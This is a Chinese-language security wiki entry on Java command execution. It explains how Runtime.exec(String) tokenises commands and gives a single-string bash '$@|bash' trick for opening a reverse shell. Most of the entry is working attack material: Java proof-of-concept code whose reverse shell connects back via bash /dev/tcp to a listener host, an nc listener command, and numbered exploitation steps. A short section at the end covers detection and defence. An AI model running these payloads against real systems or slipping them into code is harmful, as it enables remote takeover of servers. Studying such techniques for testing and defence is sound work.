---
id: web-java-rce-runtime-exec-string-tokenizer-bash-revshell
title: Runtime.exec(String) 分词限制与 bash $@|bash 单字符串反弹 Shell
type: scenario
domain: web
path: web/java/rce
technique: runtime-exec-string-tokenizer-bash-revshell
aliases:
- StringTokenizer 分词
- exec(String) 反弹 shell
- bash -c $@|bash
- $* 管道反弹
- 单字符串 payload
tags:
- java
- rce
- revshell
- runtime-exec
- stringtokenizer
- bash
- linux
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V10
  verified_at: '2026-11-05T01:24:44+08:00'
  notes: 已对照 StringTokenizer 分词截图、错误 payload 报错与 $@|bash 成功回连截图；未验证点：未在本机复现，依赖 bash /dev/tcp 与出网
---

## 一句话结论

`Runtime.exec(String)` 会用 `StringTokenizer` 按空格等字符把命令拆成 argv，重定向符号会变成普通参数而不是被 shell 解析；只可控一个字符串时，可用 `bash -c $@|bash 0 echo bash -i >& /dev/tcp/IP/PORT 0>&1` 让 bash 重新解析并反弹 Shell。

## 原理

- `Runtime.exec(String)` 内部调用 `exec(command, null, null)`，再用 `new StringTokenizer(command)` 按 ` \t\n\r\f` 分割成 `cmdarray`，最后交给 `ProcessBuilder(...).start()`。整个过程不经过 shell。
- 因此 `bash -i >& /dev/tcp/10.10.11.11/9001 0>&1` 会被拆成 `["bash","-i",">&","/dev/tcp/10.10.11.11/9001","0>&1"]`。`bash` 收到的是若干普通参数，`>&` 不会被当作重定向；bash 也不会把后面的 `/dev/tcp/...` 当网络目标，最终无法反弹。
- 最直接的修正：用数组重载 `exec(new String[]{"bash","-c","bash -i >& /dev/tcp/IP/PORT 0>&1"})`，让 `bash -c` 收到完整命令字符串，由 bash 自己解析重定向。
- 只可控 String 时的技巧：bash 的 `-c` 语义是 `bash -c command_string $0 $1 ...`，命令字符串之后的参数依次填入位置参数，`$@`/`$*` 可展开它们。利用 `$@` 展开成多个独立单词，而 `|` 是命令字符串里本来就有、会被 bash 解析的管道符。
- payload：`bash -c $@|bash 0 echo bash -i >& /dev/tcp/IP/PORT 0>&1`
  StringTokenizer 切成：`bash`、`-c`、`$@|bash`、`0`、`echo`、`bash`、`-i`、`>&`、`/dev/tcp/IP/PORT`、`0>&1`。
  bash 执行 `$@|bash`，其中 `$0=0`，`$1=echo`，`$2=bash`，`$3=-i` …；`$@` 展开为 `echo bash -i >& /dev/tcp/IP/PORT 0>&1` 这组词，作为 `echo` 的参数输出（展开产生的 `>&` 不会被重新识别为重定向）；输出通过 `|bash` 管道送给新的 bash，新 bash 从 stdin 读到 `bash -i >& /dev/tcp/IP/PORT 0>&1` 后按命令解析，完成反弹。
- 错误写法 `bash -c "$*" 0 bash -i >& /dev/tcp/IP/PORT 0>&1` 失败的原因：`"$*"` 把所有位置参数拼成一个字符串，bash 把它当成“命令名”而不是重新解析的命令行；于是报 `bash -i >& /dev/tcp/...: No such file or directory`。关键区别是“命令名”与“从 stdin 读入后再解析的命令字符串”。
- `"$@"` 与 `"$*"` 的差异：前者每个参数仍是独立单词，后者用 IFS 首字符（默认空格）拼成一整个字符串。`$@`/`$*` 不加引号时都会分词，但行为细节不同。

## 触发条件

- 已获得 Java 命令执行，且 sink 只接受一个 String（如 `Runtime.exec(String)`、某些表达式/模板注入）。
- 目标为 Linux/Unix，存在 bash，且 bash 编译时支持 `/dev/tcp` 网络重定向。
- 目标可出站连接攻击者监听端口。

## 利用步骤

1. 在 VPS 上 `nc -lvnp 9001`。
2. 优先尝试数组形式 `exec(String[]{"bash","-c","bash -i >& /dev/tcp/IP/PORT 0>&1"})`。
3. 若只能传一个 String，使用 `bash -c $@|bash 0 echo bash -i >& /dev/tcp/IP/PORT 0>&1`。
4. 观察监听端是否收到连接；若报 `No such file or directory`，说明命令被当成文件名而非重新解析，检查 `$@` 与管道位置。

## PoC

数组形式（最稳）：

```java
String[] cmd = new String[]{
    "bash", "-c",
    "bash -i >& /dev/tcp/10.10.11.11/9001 0>&1"
};
Runtime.getRuntime().exec(cmd);
```

单 String 形式：

```java
Runtime.getRuntime().exec(
    "bash -c $@|bash 0 echo bash -i >& /dev/tcp/10.10.11.11/9001 0>&1"
);
```

监听端：

```bash
nc -lvnp 9001
```

## 变体与关联

- 管道改写：`bash -c $*|bash 0 echo ...` 也可行；核心是让 `$@`/`$*` 产生“要执行的命令文本”，再通过 `|bash` 二次解析。
- 其他 shell：把 `bash` 换成 `sh` 时 `$@` 与管道语义相近，但 `/dev/tcp` 依赖 bash，sh 通常不可用。
- 命令变体：`bash -i >& /dev/tcp/IP/PORT 0>&1` 的等价写法 `bash -i >& /dev/tcp/IP/PORT 0<&1`；`>&` 是 stdout+stderr 合并重定向，`0>&1` 把 stdin 也指向同一 socket。
- 关联：[[web-java-rce-socket-revshell-stream-pump]]（不依赖 bash `/dev/tcp` 的 Java 流泵方案）；[[web-java-rce-processimpl-constructor-reflect-exec]]（绕开 Runtime.exec 直接建进程）。
- 边界：目标无 bash、`/dev/tcp` 被编译禁用、出站被封、或 exec 实现改成长度/字符白名单时失败。

## 检测与防御

- 检测：Java 进程 spawn `bash -c`，命令行含 `/dev/tcp/`、`$@|bash`、`$*|bash`；异常外连；bash 子进程由 JVM 启动。
- 防御：出站网络白名单；RASP/EDR 监控 `Runtime.exec` 与 `ProcessBuilder` 的命令行；对 `/dev/tcp` 关键字做检测；以低权限运行 Java 进程并限制其创建子进程。
